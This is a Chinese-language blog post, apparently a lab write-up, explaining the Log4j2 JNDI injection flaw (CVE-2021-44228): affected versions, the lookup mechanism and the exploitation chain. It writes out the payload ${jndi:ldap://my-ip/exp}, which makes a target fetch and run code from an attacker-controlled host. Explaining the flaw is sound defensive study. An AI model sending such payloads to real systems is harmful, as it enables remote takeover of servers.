Apache Log4j2远程代码执行漏洞

发表于2023-08-08|更新于2023-08-09|靶场
|阅读量:

简介

Apache Log4j2是一个基于java的日志记录工具，它通过配置文件中定义的规则来决定如何格式化和输出日志消息，该日志框架被大量用于业务系统开发
log4j2是一个组件，在处理日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发log4j2组件的解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限

影响版本

Apache Log4j2 2.x <= 2.14.1
Apache Log4j2 2.15.0-rc1

漏洞编号

CVE-2021-44228

原理

  • MessagePatternConverter类的format()方法是Log4j2提供的一个模式转换器，用于将日志消息中的特定模式转换为实际内容，例如存在一个模式%d{date:yyyy-MM-dd}，它表示需要将当前日期按照指定的格式输出到日志中。在调用format()方法时，Log4j2会查找该模式，并使用当前日期的值替换它，然后将结果输出到日志中。（简单来说：log4j2的模式是以“%d{”开始，用于定义日志输出的格式和内容）
  • 在漏洞中，攻击者构造一个特殊的表达式，将其作为日志消息发给受影响的log4j2应用程序，当MessagePatternConverter的format()方法检测到日志消息中包含“${”时，它会将表达式的内容解析并替换为解析后的内容，而不是保留表达式的本身
  • 举例说明，设有以下的日志配置文件： 
          在日志消息中，我们使用了 ${user.home} 表达式来引用用户的主目录路径，例如：
      logger.info("User home directory: ${user.home}");

     当Log4j2处理该日志消息时，它会检测到 ${user.home} 这个表达式，并调用相关的机制来解析它。在这种情况下，Log4j2会获取当前用户的主目录路径，并将其替换掉 ${user.home}：
      2022-01-05 [main] INFO  com.example.MyClass - User home directory: /Users/username
      意味着 Log4j2 的 MessagePatternConverter 在处理日志消息时不仅仅是保留表达式本身，而是将表达式解析并替换为相应的内容。
  • 恶意的 payload：攻击者构造一个包含恶意的 JNDI 注入代码的 Payload ，并将其作为日志消息的一部分传递给 Log4j。
  • 占位符解析：Log4j 使用 format() 方法处理日志消息，尝试解析其中的占位符，${jndi:ldap://my-ip/exp} 被视为一个占位
  • 递归解析问题：在解析占位符时，Log4j 存在递归解析的问题，它会尝试执行其中包含的 JNDI注入代码
  • JNDI lookup 操作：具体而言，Log4j 在解析阶段会尝试使用 JNDI API 进行 lookup 操作，以获取与指定的JNDI URL 相关联的资源
  • 恶意的 JNDI URL：JNDI UR ${jndi:ldap://my-ip/exp} 中的 ldap://my-ip/exp 部分是由攻击者控制的，用于指向远程资源或恶意代码
  • 远程代码执行：当 Log4j 尝试执行 JNDI lookup 操作时，它会通过 IDAP 协议连接到 my-ip 地址，并尝试获取相关资源，如果攻击成功，该地址会返回包含可执行 java 代码的 .class 文件的 URL
    （综上，通过在受影响的 Log4j 日志文件中注入恶意的 JNDI 注入代码，攻击者能够利用递归解析问题和 JNDI Lookup 操作，导致 Log4j 下载并执行远程服务器上恶意的 .class 文件，从而实现远程代码执行）
